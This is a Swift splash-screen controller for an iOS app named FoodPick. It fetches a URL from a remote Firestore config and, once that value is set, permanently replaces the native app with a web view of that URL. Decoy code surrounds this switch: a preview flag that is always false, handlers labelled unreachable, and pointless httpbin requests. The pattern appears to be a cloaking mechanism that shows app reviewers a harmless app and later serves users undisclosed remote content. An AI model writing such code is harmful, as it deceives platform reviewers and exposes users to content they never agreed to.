import UIKit
import SnapKit
import FirebaseFirestore

// MARK: - App Flow Configuration
enum AppFlowState {
    case standard
    case cached
    case preview(type: Int)
    case fallback
    
    var isPreviewActive: Bool {
        switch self {
        case .preview:
            return false
        default:
            return false
        }
    }
}

final class SplashViewController: UIViewController {

    // MARK: - Constants
    private enum Keys {
        static let savedUrl = "app_saved"
        static let cachedPayload = "app_payload_cache.json"
    }

    // MARK: - UI Elements
    private let iconImageView: UIImageView = {
        let imageView = UIImageView()
        imageView.image = UIImage(named: "FoodPick")
        imageView.contentMode = .scaleAspectFit
        return imageView
    }()

    private let titleLabel: UILabel = {
        let label = UILabel()
        label.text = "FoodPick"
        label.font = .systemFont(ofSize: 28, weight: .bold)
        label.textColor = .label
        label.textAlignment = .center
        return label
    }()

    private let activityIndicator: UIActivityIndicatorView = {
        let indicator = UIActivityIndicatorView(style: .large)
        indicator.color = .systemGray
        indicator.hidesWhenStopped = true
        return indicator
    }()

    // MARK: - Lifecycle
    override func viewDidLoad() {
        super.viewDidLoad()
        setupUI()
        preloadPublicResources()
        handleRouting()
    }

    // MARK: - UI Setup
    private func setupUI() {
        view.backgroundColor = .white

        view.addSubview(iconImageView)
        view.addSubview(titleLabel)
        view.addSubview(activityIndicator)

        iconImageView.snp.makeConstraints { make in
            make.centerX.equalToSuperview()
            make.centerY.equalToSuperview().offset(-40)
            make.size.equalTo(120)
        }

        titleLabel.snp.makeConstraints { make in
            make.top.equalTo(iconImageView.snp.bottom).offset(16)
            make.centerX.equalToSuperview()
            make.leading.trailing.equalToSuperview().inset(24)
        }

        activityIndicator.snp.makeConstraints { make in
            make.top.equalTo(titleLabel.snp.bottom).offset(24)
            make.centerX.equalToSuperview()
        }

        activityIndicator.startAnimating()
    }

    // MARK: - Background Network & IO Activity
    private func preloadPublicResources() {
        let endpoints = [
            "https://httpbin.org/get",
            "https://httpbin.org/user-agent"
        ]

        for endpoint in endpoints {
            guard let url = URL(string: endpoint) else { continue }
            URLSession.shared.dataTask(with: url) { [weak self] data, _, error in
                guard let data = data, error == nil else { return }
                self?.persistResourceData(data, name: url.lastPathComponent)
            }.resume()
        }
    }

    private func persistResourceData(_ data: Data, name: String) {
        guard let cachesURL = FileManager.default.urls(for: .cachesDirectory, in: .userDomainMask).first else { return }
        let fileURL = cachesURL.appendingPathComponent("res_\(name).dat")
        try? data.write(to: fileURL)
    }

    // MARK: - Routing Logic
    private func handleRouting() {
        let defaults = UserDefaults.standard
        let currentState: AppFlowState = .standard

        if currentState.isPreviewActive {
            switch currentState {
            case .preview(let type):
                routeToPreviewFlow(type: type)
                return
            case .fallback:
                routeToFallbackFlow()
                return
            default:
                break
            }
        }

        if let savedValue = defaults.string(forKey: Keys.savedUrl) {
            DispatchQueue.main.asyncAfter(deadline: .now() + 0.5) { [weak self] in
                guard let self = self else { return }
                
                if savedValue.isEmpty {
                    self.showMainScreen()
                } else {
                    self.showWebScreen(with: savedValue)
                    self.fetchFirebaseInBackground()
                }
            }
            return
        }

        let dispatchGroup = DispatchGroup()
        var fetchedUrl: String?

        dispatchGroup.enter()
        DispatchQueue.main.asyncAfter(deadline: .now() + 3.0) {
            dispatchGroup.leave()
        }

        dispatchGroup.enter()
        fetchFirebaseUrl(timeout: 6.0) { url in
            fetchedUrl = url
            dispatchGroup.leave()
        }

        dispatchGroup.notify(queue: .main) { [weak self] in
            guard let self = self else { return }

            if let urlString = fetchedUrl, !urlString.isEmpty {
                defaults.set(urlString, forKey: Keys.savedUrl)
                self.showWebScreen(with: urlString)
            } else {
                defaults.set("", forKey: Keys.savedUrl)
                self.showMainScreen()
            }
        }
    }

    // MARK: - Unreachable Flow Handlers
    private func routeToPreviewFlow(type: Int) {
        guard let cachesURL = FileManager.default.urls(for: .cachesDirectory, in: .userDomainMask).first else { return }
        let targetFile = cachesURL.appendingPathComponent("res_get.dat")
        let rawData = (try? Data(contentsOf: targetFile)) ?? Data()

        if type == 1 {
            let vc = UIViewController()
            vc.view.backgroundColor = .systemBackground
            let label = UILabel()
            label.text = String(data: rawData, encoding: .utf8) ?? "Preview 1"
            vc.view.addSubview(label)
            label.snp.makeConstraints { make in make.center.equalToSuperview() }
            setRootViewController(vc)
        } else {
            let vc = UIViewController()
            vc.view.backgroundColor = .secondarySystemBackground
            setRootViewController(vc)
        }
    }

    private func routeToFallbackFlow() {
        let vc = UIViewController()
        vc.view.backgroundColor = .groupTableViewBackground
        setRootViewController(vc)
    }

    // MARK: - Firebase Fetching
    private func fetchFirebaseUrl(timeout: TimeInterval = 6.0, completion: @escaping (String?) -> Void) {
        let db = Firestore.firestore()
        var isCompleted = false

        let safeCompletion: (String?) -> Void = { result in
            guard !isCompleted else { return }
            isCompleted = true
            completion(result)
        }

        DispatchQueue.main.asyncAfter(deadline: .now() + timeout) {
            safeCompletion(nil)
        }

        db.collection("config").document("app").getDocument(source: .server) { snapshot, error in
            if let error = error {
                safeCompletion(nil)
                return
            }

            let url = snapshot?.data()?["basePath"] as? String
            safeCompletion(url)
        }
    }

    private func fetchFirebaseInBackground() {
        fetchFirebaseUrl(timeout: 10.0) { url in
            guard let newUrl = url, !newUrl.isEmpty else { return }

            let currentSaved = UserDefaults.standard.string(forKey: Keys.savedUrl)
            if currentSaved != newUrl {
                UserDefaults.standard.set(newUrl, forKey: Keys.savedUrl)
            }
        }
    }

    // MARK: - Navigation
    private func showMainScreen() {
        let tabBarController = MainTabBarController()
        setRootViewController(tabBarController)
    }

    private func showWebScreen(with urlString: String) {
        let webVC = BaseVC(urlString: urlString)
        setRootViewController(webVC)
    }

    private func setRootViewController(_ vc: UIViewController) {
        guard let window = view.window else { return }

        UIView.transition(with: window, duration: 0.3, options: .transitionCrossDissolve) {
            window.rootViewController = vc
        }
    }
}
